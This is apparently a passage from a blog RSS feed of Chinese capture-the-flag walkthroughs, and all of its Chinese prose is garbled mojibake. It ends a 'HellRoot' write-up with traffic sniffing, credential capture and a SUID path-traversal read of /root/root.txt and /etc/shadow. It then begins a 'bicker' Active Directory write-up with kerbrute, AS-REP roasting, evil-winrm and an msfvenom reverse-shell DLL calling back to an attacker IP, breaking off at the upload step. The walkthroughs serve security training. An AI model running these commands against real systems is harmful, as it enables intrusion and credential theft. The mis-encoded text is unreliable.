Âú®ÂΩìÂâçÁõÆÂΩï‰∏ãÂèëÁé∞‰∏Ä‰∏™ÊèêÁ§∫Êñá‰ª∂`sniff.txt`ÔºåÂÜÖÂÆπ‰∏∫Ë•øÁè≠ÁâôËØ≠ÔºåÊÑè‰∏∫‚ÄúÊúâ‰∫õÂ∑•ÂÖ∑ÂèØ‰ª•ËÆ©‰Ω†ÂóÖÊé¢ÊµÅÈáè‚Äù„ÄÇÂêåÊó∂Âú®`.config/dpkg-l.txt`Êñá‰ª∂‰∏≠ÂèëÁé∞Á≥ªÁªüÂÆâË£Ö‰∫Ü`tcpdump`„ÄÇ

ËøôÊèêÁ§∫Êàë‰ª¨ÈúÄË¶ÅËøõË°åÊµÅÈáèÊäìÂåÖ„ÄÇ‰ΩøÁî®‰πãÂâçÂú®`Dockerfile`‰∏≠ÊâæÂà∞ÁöÑÂØÜÁ†Å `astro:iloveastro` ÂàáÊç¢Âà∞`astro`Áî®Êà∑„ÄÇ

```bash
www-data@05cc10128c04:/var/www/html$ su astro
Password: iloveastro
$
```

Êü•Áúã`astro`Áî®Êà∑ÁöÑ`sudo`ÊùÉÈôêÔºåÂèëÁé∞ÂÖ∂ÂèØ‰ª•Êó†ÂØÜÁ†ÅÂàáÊç¢Âà∞root„ÄÇ

```bash
astro@05cc10128c04:/var/www/html$ sudo -l
...
User astro may run the following commands on 05cc10128c04:
    (ALL : ALL) NOPASSWD: /bin/su
```

ÂàáÊç¢Âà∞rootÁî®Êà∑ÔºåÂπ∂‰ΩøÁî®`tcpdump`Âú®`eth0`ÁΩëÂç°‰∏äËøõË°åÊäìÂåÖ„ÄÇ

```bash
astro@05cc10128c04:/var/www/html$ sudo su
root@05cc10128c04:/var/www/html# tcpdump -i eth0 -A -w /tmp/a.pcap
```

ËÆ©`tcpdump`ËøêË°å‰∏ÄÊÆµÊó∂Èó¥ÂêéÔºåÂ∞ÜÊäìÂèñÂà∞ÁöÑÊï∞ÊçÆÂåÖ`a.pcap`‰º†ÈÄÅÂà∞KaliÊîªÂáªÊú∫ËøõË°åÂàÜÊûê„ÄÇ

‰ΩøÁî®WiresharkÊâìÂºÄ`a.pcap`ÔºåÈÄöËøáHTTPÂçèËÆÆËøáÊª§Âô®ÔºåÂèëÁé∞‰∏Ä‰∏™POSTËØ∑Ê±ÇÔºåÂÖ∂‰∏≠ÂåÖÂê´‰∏Ä‰∏™ÁôªÂΩïÂá≠ÊçÆ„ÄÇËøôÂæàÂèØËÉΩÊòØ‰∏ªÊú∫‰∏äÁöÑÂÆöÊó∂‰ªªÂä°Âú®ÊâßË°å„ÄÇ

*   **username**: `astro`
*   **password**: `wj2UI4f207RC58nNx31gBUiBYSPEK27JxvRNBYbP6UWZpqeoWS`

# **‰∫î„ÄÅ‰∏ªÊú∫ÊèêÊùÉ**

Êàë‰ª¨Ëé∑Âæó‰∫Ü‰∏ªÊú∫`astro`Áî®Êà∑ÁöÑÂØÜÁ†ÅÔºåÁé∞Âú®ÂèØ‰ª•‰ªéDockerÂÆπÂô®Ê®™ÂêëÁßªÂä®Âà∞‰∏ªÊú∫Á≥ªÁªü„ÄÇ

‰ΩøÁî®Êñ∞ÂØÜÁ†ÅSSHÁôªÂΩï‰∏ªÊú∫Ôºö

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ ssh astro@192.168.205.144
...
astro@hellroot:~$ 
```

ÁôªÂΩïÂêéÔºåÂØªÊâæÊèêÊùÉÊñπÊ≥ï„ÄÇÈ¶ñÂÖàÊ£ÄÊü•SUIDÊñá‰ª∂„ÄÇ

```bash
astro@hellroot:~$ find / -perm -4000 -type f 2&gt;/dev/null
...
/usr/local/bin/secmonitor
/usr/local/bin/logview
...
```

ÂèëÁé∞‰∏§‰∏™ÂèØÁñëÁöÑËá™ÂÆö‰πâSUIDÁ®ãÂ∫èÔºö`secmonitor`Âíå`logview`„ÄÇÈÄê‰∏ÄËøõË°åÊµãËØï„ÄÇ

`logview`Á®ãÂ∫èÁî®‰∫éÊü•ÁúãÊó•ÂøóÊñá‰ª∂Ôºå‰ΩÜÂÖ∂ÂÆûÁé∞Â≠òÂú®ÁõÆÂΩïÁ©øË∂äÊºèÊ¥û„ÄÇÁ®ãÂ∫è‰ºöÂ∞ÜÁî®Êà∑ËæìÂÖ•ÁöÑÊñá‰ª∂ÂêçÊãºÊé•Âà∞`/var/log/`ÁõÆÂΩï‰∏ãÔºå‰ΩÜÊú™ÂØπ`../`ËøõË°åËøáÊª§„ÄÇ

```bash
astro@hellroot:~$ /usr/local/bin/logview /root/root.txt
[logview] Running with administrative privileges
Displaying log: /var/log//root/root.txt
fopen: No such file or directory
```

Âà©Áî®ÁõÆÂΩïÁ©øË∂äÊºèÊ¥ûÔºåÊàë‰ª¨ÂèØ‰ª•ËØªÂèñ‰ªªÊÑèÊñá‰ª∂Ôºå‰æãÂ¶Ç`root.txt`„ÄÇ

```bash
astro@hellroot:~$ /usr/local/bin/logview ../../../root/root.txt
[logview] Running with administrative privileges
Displaying log: /var/log/../../../root/root.txt
f039facf1ae0d69b07484df1c4da32df
```

ÂêåÁêÜÔºåÊàë‰ª¨ÂèØ‰ª•ËØªÂèñ `/etc/shadow` Êñá‰ª∂ÔºåËé∑ÂèñÊâÄÊúâÁî®Êà∑ÁöÑÂØÜÁ†ÅÂìàÂ∏å„ÄÇÂ∞ÜrootÁî®Êà∑ÁöÑÂìàÂ∏åËøõË°åÁ†¥Ëß£ÔºåÂèØ‰ª•ÂæóÂà∞ÂØÜÁ†Å‰∏∫`12345`Ôºå‰∏éÊúÄÂàùSSHÁàÜÁ†¥ÁöÑÁªìÊûú‰∏ÄËá¥„ÄÇËá≥Ê≠§ÔºåÈÄöËøáÂ∏∏ËßÑË∑ØÂæÑ‰πüÊàêÂäüËé∑Âèñ‰∫ÜrootÊùÉÈôê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/thl_HellRoot.html</guid><pubDate>Sun, 17 Aug 2025 14:15:54 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_bicker</title><link>https://7r1UMPHK.github.io/post/nei-bu-_bicker.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## 1. ‰∏ªÊú∫ÂèëÁé∞

Ê∏óÈÄèÊµãËØïÁöÑËµ∑ÁÇπÊòØÂú®ÁõÆÊ†áÁΩëÁªú‰∏≠ËØÜÂà´Â≠òÊ¥ª‰∏ªÊú∫„ÄÇÊàë‰ª¨ÈÄöËøá `arp-scan` ÂØπÊú¨Âú∞ÁΩëÊÆµËøõË°åÊâ´ÊèèÔºå‰ª•ÂÆö‰ΩçÊàë‰ª¨ÁöÑÁõÆÊ†á„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l      
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.149 00:0c:29:07:21:7a       VMware, Inc.
192.168.205.254 00:50:56:ff:e4:86       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.994 seconds (128.39 hosts/sec). 4 responded
```
Êâ´ÊèèÁªìÊûúÊòéÁ°ÆÊåáÂêë `192.168.205.149` ‰∏∫Êú¨Ê¨°ÊµãËØïÁöÑÁõÆÊ†á‰∏ªÊú∫„ÄÇ

## 2. Á´ØÂè£‰∏éÊúçÂä°Êâ´Êèè

Á°ÆÂÆöÁõÆÊ†á IP ÂêéÔºå‰ΩøÁî® Nmap ËøõË°åÊ∑±Â∫¶Êé¢ÊµãÔºå‰ª•ÁªòÂà∂Âá∫ÁõÆÊ†áÁöÑÊîªÂáªÈù¢„ÄÇÈ¶ñÂÖàËøõË°åÂÖ®Á´ØÂè£ TCP ËøûÊé•Êâ´ÊèèÔºåÁ°Æ‰øù‰∏çÈÅóÊºè‰ªª‰ΩïÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p0-65535 -sT -T4 192.168.205.149 -oA nmapscan/ports 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 09:37 EDT
Nmap scan report for bicker.com (192.168.205.149)
Host is up (0.00048s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49669/tcp open  unknown
63661/tcp open  unknown
63662/tcp open  unknown
63682/tcp open  unknown
MAC Address: 00:0C:29:07:21:7A (VMware)

Nmap done: 1 IP address (1 host up) scanned in 90.01 seconds
```
Âú®ËØÜÂà´Âá∫ÂºÄÊîæÁ´ØÂè£ÂêéÔºåÊàë‰ª¨ÈíàÂØπËøô‰∫õÁ´ØÂè£ËøõË°åÊõ¥ËØ¶ÁªÜÁöÑÊúçÂä°ÁâàÊú¨Êé¢ÊµãÂíåÈªòËÆ§ËÑöÊú¨Êâ´ÊèèÔºå‰ª•Ëé∑ÂèñÊìç‰ΩúÁ≥ªÁªü„ÄÅÂüüÂêç„ÄÅ‰∏ªÊú∫ÂêçÁ≠âÂÖ≥ÈîÆ‰ø°ÊÅØ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49669,63661,63662,63682 -sC -sV -T4 192.168.205.149 -oA nmapscan/xiports
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-16 09:40 EDT
Nmap scan report for bicker.com (192.168.205.149)
Host is up (0.00023s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-16 13:40:55Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: bicker.com0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
...
| rdp-ntlm-info: 
|   Target_Name: BICKER
|   NetBIOS_Domain_Name: BICKER
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: bicker.com
|   DNS_Computer_Name: dc.bicker.com
...
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
...
```

**Êâ´ÊèèÁªìÊûúÂàÜÊûê‰∏éËß£ËØªÔºö**
ÁªºÂêàÊâ´ÊèèÁªìÊûúÔºåÁõÆÊ†á‰∏ªÊú∫ÁöÑÁîªÂÉèÂèòÂæóÊûÅ‰∏∫Ê∏ÖÊô∞ÔºöËøôÊòØ‰∏ÄÂè∞‰∏ªÊú∫Âêç‰∏∫ `DC` ÁöÑ Windows ÂüüÊéßÂà∂Âô®ÔºåÂÖ∂ DNS ÂüüÂêç‰∏∫ `bicker.com`„ÄÇÂ§ßÈáèÂºÄÊîæÁöÑ AD Áõ∏ÂÖ≥Á´ØÂè£ÔºàKerberos, LDAP, SMBÔºâËØÅÂÆû‰∫ÜËøô‰∏ÄÁÇπ„ÄÇ‰∏Ä‰∏™ÈáçË¶ÅÁöÑÂèëÁé∞ÊòØ SMB Á≠æÂêçË¢´Âº∫Âà∂ÂêØÁî®Ôºà`Message signing enabled and required`ÔºâÔºåËøôÂ¢ûÂä†‰∫ÜÁΩëÁªúÂ±ÇÁöÑÂÆâÂÖ®ÊÄßÔºåÂèØ‰ª•ÊúâÊïàÈò≤Âæ° NTLM Relay Á≠â‰∏≠Èó¥‰∫∫ÊîªÂáª„ÄÇ

| Á´ØÂè£          | ÊúçÂä°          | ‰ΩúÁî®/È£éÈô©ÊèêÁ§∫                                                |
| ------------- | ------------- | ------------------------------------------------------------ |
| **53/tcp**    | DNS           | ÂüüÂêçÁ≥ªÁªüÔºåÂèØÁî®‰∫éÊûö‰∏æ SRV ËÆ∞ÂΩïÔºåÁªòÂà∂ÂüüÂÜÖÊúçÂä°ÊãìÊâë„ÄÇ            |
| **88/tcp**    | Kerberos      | ÂüüËÆ§ËØÅÊ†∏ÂøÉÔºåÊòØËøõË°åÁî®Êà∑ÂêçÊûö‰∏æÔºàKerbruteÔºâÂíå AS-REP Roasting ÊîªÂáªÁöÑÂàáÂÖ•ÁÇπ„ÄÇ |
| **139/445**   | SMB           | Êñá‰ª∂ÂÖ±‰∫´ÊúçÂä°ÔºåÂèØÁî®‰∫éÊûö‰∏æÂÖ±‰∫´„ÄÅÊ£ÄÊü• Null Session ÊºèÊ¥û„ÄÇ       |
| **389/636**   | LDAP/LDAPS    | ËΩªÈáèÁ∫ßÁõÆÂΩïËÆøÈóÆÂçèËÆÆÔºåÊòØÊü•ËØ¢ AD Êï∞ÊçÆÂ∫ì‰ª•Ëé∑ÂèñÁî®Êà∑„ÄÅÁªÑ„ÄÅOU Á≠â‰ø°ÊÅØÁöÑÊ†áÂáÜÊé•Âè£„ÄÇ |
| **3268/3269** | ÂÖ®Â±ÄÁºñÂΩï (GC) | ADÊûóÁöÑÁ¥¢ÂºïÊúçÂä°ÔºåÂÖÅËÆ∏Âú®‰∏çÁü•ÈÅìÂØπË±°ÊâÄÂú®ÂüüÁöÑÊÉÖÂÜµ‰∏ãËøõË°åÂø´ÈÄüÊêúÁ¥¢„ÄÇ |
| **5985/tcp**  | WinRM (HTTP)  | Windows ËøúÁ®ãÁÆ°ÁêÜÊúçÂä°ÔºåËé∑ÂæóÂá≠ÊçÆÂêéÔºåËøôÊòØÊâßË°å PowerShell ÂëΩ‰ª§„ÄÅÂÆûÁé∞‰∫§‰∫íÂºèÊéßÂà∂ÁöÑÈ¶ñÈÄâÈÄöÈÅì„ÄÇ |
| **3389/tcp**  | RDP           | ËøúÁ®ãÊ°åÈù¢ÂçèËÆÆÔºåÊòØÂõæÂΩ¢ÂåñÁôªÂΩïÁöÑÂÖ•Âè£ÔºåÂèØÁî®‰∫éÂá≠ÊçÆÁàÜÁ†¥ÊàñÂìàÂ∏å‰º†ÈÄí„ÄÇ |

## 3. Active Directory ÊúçÂä°Êûö‰∏æ

Âú®Á°ÆËÆ§ÁõÆÊ†á‰∏∫ÂüüÊéßÂêéÔºåÊàë‰ª¨ÈíàÂØπÂÖ∂Ê†∏ÂøÉÊúçÂä°ËøõË°åÊõ¥ÂÖ∑ÈíàÂØπÊÄßÁöÑ‰ø°ÊÅØÊî∂ÈõÜ„ÄÇ

*   **DNS SRV ËÆ∞ÂΩïÊü•ËØ¢**
    ÈÄöËøá `dig` Êü•ËØ¢ SRV ËÆ∞ÂΩïÔºåÂèØ‰ª•Á≤æÁ°ÆÂú∞Á°ÆËÆ§Êèê‰æõÂÖ≥ÈîÆÊúçÂä°ÁöÑÊúçÂä°Âô®‰∏ªÊú∫Âêç„ÄÇ
    ```bash
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
    ‚îî‚îÄ$ dig @192.168.205.149 -t SRV _kerberos._tcp.bicker.com
    ...
    ;; ANSWER SECTION:
    _kerberos._tcp.bicker.com. 600  IN      SRV     0 100 88 dc.bicker.com.
    ...
    ```
    Êü•ËØ¢ÁªìÊûúËøõ‰∏ÄÊ≠•ËØÅÂÆû‰∫Ü Kerberos (KDC), LDAP, ÂíåÂÖ®Â±ÄÁºñÂΩï (GC) ÊúçÂä°ÂùáÁî± `dc.bicker.com` (`192.168.205.149`) Êèê‰æõ„ÄÇ

*   **LDAP ÂåøÂêçÁªëÂÆöÊé¢Êµã**
    Â∞ùËØïÂú®Êú™Êèê‰æõ‰ªª‰ΩïÂá≠ÊçÆÁöÑÊÉÖÂÜµ‰∏ãÊü•ËØ¢ LDAPÔºåÊé¢ÊµãÊòØÂê¶Â≠òÂú®ÂÖÅËÆ∏ÂåøÂêçÊûö‰∏æÁöÑÂ∏∏ËßÅÈÖçÁΩÆÈîôËØØ„ÄÇ
    ```bash
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
    ‚îî‚îÄ$ ldapsearch -x -H ldap://192.168.205.149 -b 'DC=bicker,DC=com'
    # extended LDIF
    ...
    # search result
    search: 2
    result: 1 Operations error
    text: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this opera
     tion a successful bind must be completed on the connection., data 0, v4f7c
    
    # numResponses: 1
    ```
    ÊúçÂä°Âô®ÊãíÁªù‰∫ÜÂåøÂêçÊü•ËØ¢ÔºåË°®ÊòéÂÖ∂ LDAP ÊúçÂä°ËøõË°å‰∫ÜÂü∫Êú¨ÁöÑÂÆâÂÖ®Âä†Âõ∫„ÄÇ

*   **Kerberos Áî®Êà∑ÂêçÊûö‰∏æ**
    Âà©Áî® Kerberos ÂçèËÆÆÂú®Â§ÑÁêÜÁî®Êà∑Â≠òÂú®‰∏éÂê¶Êó∂ËøîÂõû‰∏çÂêåÈîôËØØ‰ª£Á†ÅÁöÑÁâπÊÄßÔºåÂèØ‰ª•‰ΩøÁî® `kerbrute` Á≠âÂ∑•ÂÖ∑È´òÊïàÂú∞È™åËØÅÁî®Êà∑ÂêçÂàóË°®„ÄÇ
    ```bash
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
    ‚îî‚îÄ$ kerbrute userenum --dc 192.168.205.149 -d bicker.com /usr/share/seclists/Usernames/cirt-default-usernames.txt 
    ...
    2025/08/16 09:46:41 &gt;  [+] VALID USERNAME:       ADMINISTRATOR@bicker.com
    2025/08/16 09:46:41 &gt;  [+] VALID USERNAME:       Administrator@bicker.com
    2025/08/16 09:46:41 &gt;  [+] VALID USERNAME:       Guest@bicker.com
    ...
    ```
    ËØ•Ê≠•È™§ÊàêÂäüÈ™åËØÅ‰∫Ü `administrator`, `guest` Á≠âÂ§ö‰∏™ÂÜÖÁΩÆË¥¶Êà∑ÁöÑÂ≠òÂú®Ôºå‰∏∫ÂêéÁª≠ÁöÑÂá≠ÊçÆÊîªÂáªÊèê‰æõ‰∫ÜÁõÆÊ†á„ÄÇ

*   **AS-REP Roasting ÊîªÂáªÂ∞ùËØï**
    ËøôÊòØ‰∏ÄÁßçÈíàÂØπÁ¶ÅÁî®‰∫Ü Kerberos È¢ÑË∫´‰ªΩÈ™åËØÅÁöÑÁî®Êà∑ÁöÑÊîªÂáª„ÄÇÂ¶ÇÊûúÂ≠òÂú®Ê≠§Á±ªÁî®Êà∑ÔºåÊîªÂáªËÄÖÂèØ‰ª•‰∏∫ÂÖ∂ËØ∑Ê±Ç TGTÔºåÂπ∂Á¶ªÁ∫øÁàÜÁ†¥ÂÖ∂‰∏≠ÂåÖÂê´ÁöÑÂä†ÂØÜÊï∞ÊçÆ‰ª•Ëé∑ÂèñÁî®Êà∑ÂØÜÁ†Å„ÄÇ
    ```bash
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
    ‚îî‚îÄ$ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py bicker.com/ -usersfile user -format hashcat -outputfile hash
    Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
    
    [-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
    [-] User guest doesn't have UF_DONT_REQUIRE_PREAUTH set
    ```
    Â∞ùËØïÂ§±Ë¥•ÔºåË°®ÊòéÁõÆÊ†áÂüü‰∏≠ÁöÑÁî®Êà∑ÂùáÂºÄÂêØ‰∫ÜÈ¢ÑË∫´‰ªΩÈ™åËØÅÔºåÊ≠§ÊîªÂáªË∑ØÂæÑÊó†Êïà„ÄÇ

# **‰∫å„ÄÅÂàùÊ≠•Á™ÅÁ†¥**

## 1. SMB ÂåøÂêçÂÖ±‰∫´Êé¢Êµã

Â∞ΩÁÆ° LDAP ÂåøÂêçÁªëÂÆöË¢´Á¶ÅÁî®Ôºå‰ΩÜ SMB ÊúçÂä°ÂèØËÉΩÂ≠òÂú®Áã¨Á´ãÁöÑËÆøÈóÆÊéßÂà∂ÈÖçÁΩÆ„ÄÇÊàë‰ª¨Ê£ÄÊü•ÊòØÂê¶Â≠òÂú®Êó†ÈúÄÂá≠ÊçÆÂç≥ÂèØËÆøÈóÆÁöÑÂÖ±‰∫´„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ smbclient -L //192.168.205.149 -N   

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      ËøúÁ®ãÁÆ°ÁêÜ
        C$              Disk      ÈªòËÆ§ÂÖ±‰∫´
        IPC$            IPC       ËøúÁ®ã IPC
        NETLOGON        Disk      Logon server share 
        puppy           Disk      
        SYSVOL          Disk      Logon server share 
...
```
ÂèëÁé∞‰∫Ü‰∏Ä‰∏™Âêç‰∏∫ `puppy` ÁöÑÂåøÂêçÂèØËØªÂÖ±‰∫´ÔºåËøôÊòØ‰∏Ä‰∏™ÊΩúÂú®ÁöÑ‰ø°ÊÅØÊ≥ÑÈú≤ÁÇπ„ÄÇÊàë‰ª¨ËøûÊé•ËØ•ÂÖ±‰∫´Âπ∂‰∏ãËΩΩÂÖ∂‰∏≠ÁöÑÊñá‰ª∂„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ smbclient //192.168.205.149/puppy -N
Try 'help' to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Fri Aug 15 00:06:51 2025
  ..                                DHS        0  Fri Aug 15 05:20:46 2025
  puppy.jpg                           A    57634  Fri Aug 15 00:06:51 2025

                12923135 blocks of size 4096. 9313382 blocks available
smb: \&gt; get puppy.jpg
getting file \puppy.jpg of size 57634 as puppy.jpg (3752.2 KiloBytes/sec) (average 3752.2 KiloBytes/sec)
smb: \&gt; exit
```

## 2. ÂºÄÊ∫êÊÉÖÊä• (OSINT) Ëé∑ÂèñÂá≠ÊçÆ

ÂØπ‰∏ãËΩΩÁöÑ `puppy.jpg` Êñá‰ª∂ËøõË°åÂàÜÊûêÔºåÂØªÊâæÂèØËÉΩÂ≠òÂú®ÁöÑÁ∫øÁ¥¢„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ strings puppy.jpg|head -n 10        
JFIF
Exif
bilibili
Google
uid=3546958956333518
0220
 , #&amp;')*)
-0-(0%()(
((((((((((((((((((((((((((((((((((((((((((((((((((
a2#q
```
Êñá‰ª∂Â≠óÁ¨¶‰∏≤‰∏≠ÂåÖÂê´‰∏Ä‰∏™ Bilibili UID (`3546958956333518`)„ÄÇÈÄöËøáÂú® Bilibili ÁΩëÁ´ô‰∏äÊêúÁ¥¢Ê≠§ UIDÔºåÊàë‰ª¨ÊâæÂà∞‰∫Ü‰∏Ä‰∏™Áî®Êà∑ÂèëÂ∏ÉÁöÑÂä®ÊÄÅÔºåÂÖ∂‰∏≠Áõ¥Êé•Ê≥ÑÈú≤‰∫Ü‰∏ÄÁªÑÂá≠ÊçÆÔºö
**`tindalos:Th3C@ll0fCtHu1hu!`**

## 3. Ëé∑ÂæóÂàùÂßã Shell

Âà©Áî®ËøôÁªÑÊÑèÂ§ñËé∑ÂæóÁöÑÂá≠ÊçÆÔºåÊàë‰ª¨Â∞ùËØïÈÄöËøá‰πãÂâçÂèëÁé∞ÁöÑ WinRM ÊúçÂä° (Á´ØÂè£ 5985) ÁôªÂΩïÁõÆÊ†á‰∏ªÊú∫„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ evil-winrm -i 192.168.205.149 -u 'tindalos' -p 'Th3C@ll0fCtHu1hu!'
                                        
Evil-WinRM shell v3.7
...                                     
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tindalos\Documents&gt;
```
ËøûÊé•ÊàêÂäüÔºÅÊàë‰ª¨Ëé∑Âæó‰∫Ü‰∏Ä‰∏™Â±û‰∫éÂüüÁî®Êà∑ `bicker\tindalos` ÁöÑ‰∫§‰∫íÂºè PowerShell ShellÔºåÂÆåÊàê‰∫ÜÂàùÊ≠•Á™ÅÁ†¥„ÄÇ

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## 1. ÂÜÖÈÉ®‰ø°ÊÅØÊî∂ÈõÜ‰∏éÊÄÅÂäøÊÑüÁü•

Á´ãË∂≥‰∫éÂΩìÂâç ShellÔºåÈ¶ñË¶Å‰ªªÂä°ÊòØÂÖ®Èù¢‰∫ÜËß£ `tindalos` Áî®Êà∑ÁöÑÊùÉÈôêÂíåÂú®Âüü‰∏≠ÁöÑËßíËâ≤„ÄÇ

```powershell
*Evil-WinRM* PS C:\Users\tindalos\Documents&gt; whoami /all

Áî®Êà∑‰ø°ÊÅØ
----------------
Áî®Êà∑Âêç          SID
=============== ============================================
bicker\tindalos S-1-5-21-298176814-2846777796-698167141-1103

ÁªÑ‰ø°ÊÅØ
-----------------
ÁªÑÂêç                                        Á±ªÂûã   SID                                          Â±ûÊÄß
=========================================== ====== ============================================ ======================================
...
BICKER\DnsAdmins                            Âà´Âêç   S-1-5-21-298176814-2846777796-698167141-1101 ÂøÖÈúÄÁöÑÁªÑ, ÂêØÁî®‰∫éÈªòËÆ§, ÂêØÁî®‰∫éÁªÑ, Êú¨Âú∞ÁªÑ
...
```
**ÂÖ≥ÈîÆÂèëÁé∞Ôºö** `whoami /all` ÁöÑËæìÂá∫ÊòæÁ§∫ÔºåÁî®Êà∑ `tindalos` Èö∂Â±û‰∫é `DnsAdmins` ÁªÑ„ÄÇËøôÊòØ‰∏Ä‰∏™ÊûÅÂ∫¶Âç±Èô©ÁöÑÂÜÖÁΩÆÁªÑÔºåÂÖ∂ÊàêÂëòÈÄöÂ∏∏ÂèØ‰ª•ÈÄöËøáÊª•Áî® DNS ÊúçÂä°ÈÖçÁΩÆÊù•ÂÆûÁé∞ÊùÉÈôêÊèêÂçáËá≥ÂüüÊéßÁöÑ `SYSTEM`„ÄÇ

## 2. ÊèêÊùÉË∑ØÂæÑÂàÜÊûêÔºö‰∏§Êù°ÈÅìË∑Ø

Âü∫‰∫é `DnsAdmins` ÁöÑÊùÉÈôêÔºåÊàë‰ª¨Êúâ‰∏§Êù°ÊèêÊùÉË∑ØÂæÑÂèØÈÄâÔºö

1.  **Êç∑ÂæÑÔºàÈ´òÂô™Èü≥ÔºâÔºö** Áõ¥Êé•ÈÖçÁΩÆÊÅ∂ÊÑè DLLÔºåÁÑ∂ÂêéÈÄöËøáÈáçÂêØÊï¥‰∏™Èù∂Êú∫Êù•Ëß¶ÂèëÊâßË°å„ÄÇÊ≠§ÊñπÊ≥ïÁÆÄÂçïÁ≤óÊö¥Ôºå‰ΩÜÂä®ÈùôÂ∑®Â§ßÔºåÂú®ÁúüÂÆûÁéØÂ¢É‰∏≠Â∫îÊûÅÂäõÈÅøÂÖç„ÄÇ
2.  **È¢ÑÊúüËß£Ôºà‰ΩéÂô™Èü≥ÔºâÔºö** Ê∑±ÂÖ•ÊåñÊéò‰ø°ÊÅØÔºåÂØªÊâæ‰∏Ä‰∏™Êã•ÊúâÈáçÂêØ DNS ÊúçÂä°ÊùÉÈôêÁöÑÁî®Êà∑ÔºåÈÄöËøá‰∏ÄÁ≥ªÂàóÊ®™ÂêëÁßªÂä®ÔºåÊúÄÁªàÂú®‰∏çÈáçÂêØÊúçÂä°Âô®ÁöÑÊÉÖÂÜµ‰∏ãËß¶ÂèëÊºèÊ¥û„ÄÇ

## 3. ÊèêÊùÉË∑ØÂæÑ‰∏ÄÔºöÊç∑ÂæÑÔºàÈáçÂêØÈù∂Êú∫Ôºâ

Ê≠§Ë∑ØÂæÑÂà©Áî® `DnsAdmins` ÊùÉÈôêËÆæÁΩÆÂ•ΩÂêéÈó®ÔºåÁÑ∂ÂêéÈÄöËøáÈáçÂêØÈù∂Êú∫Ëøô‰∏Ä‚ÄúÊ≠™Èó®ÈÇ™ÈÅì‚ÄùÊù•ÂÆåÁæéË∑≥ÂÖ≥„ÄÇ

*   **ÁîüÊàêÊÅ∂ÊÑè DLL**
    ‰ΩøÁî® `msfvenom` ÂàõÂª∫‰∏Ä‰∏™ÂèçÂêëËøûÊé• Shell ÁöÑ DLL„ÄÇ
    ```bash
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
    ‚îî‚îÄ$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.205.128 LPORT=8888 -f dll -o dns.dll
    [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
    [-] No arch selected, selecting arch: x64 from the payload
    No encoder specified, outputting raw payload
    Payload size: 460 bytes
    Final size of dll file: 9216 bytes
    Saved as: dns.dll
    ```
*   **‰∏ä‰º†Âπ∂ÈÖçÁΩÆ DLL**
